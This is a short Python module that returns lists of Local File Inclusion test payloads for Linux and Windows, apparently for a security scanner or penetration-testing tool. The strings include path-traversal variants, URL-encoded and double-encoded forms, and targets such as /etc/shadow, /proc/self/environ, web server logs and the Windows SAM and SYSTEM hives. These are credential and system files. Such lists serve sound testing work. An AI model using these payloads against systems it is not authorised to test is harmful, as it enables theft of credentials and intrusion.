"""
LFI payloads for testing Local File Inclusion vulnerabilities
"""

class LFIPayloads:
    """LFI payload collection"""
    
    @staticmethod
    def get_linux_payloads():
        """Get Linux LFI payloads"""
        return [
            "../../../etc/passwd",
            "/etc/passwd",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "/etc/shadow",
            "/etc/hosts",
            "/proc/version",
            "/proc/self/environ",
            "../../../var/log/apache2/access.log"
        ]
    
    @staticmethod
    def get_windows_payloads():
        """Get Windows LFI payloads"""
        return [
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "..\\..\\..\\windows\\win.ini",
            "C:\\windows\\win.ini",
            "..\\..\\..\\windows\\system.ini",
            "C:\\boot.ini",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "C:\\windows\\system32\\config\\system"
        ]
    
    @staticmethod
    def get_all_payloads():
        """Get all LFI payloads"""
        return LFIPayloads.get_linux_payloads() + LFIPayloads.get_windows_payloads()
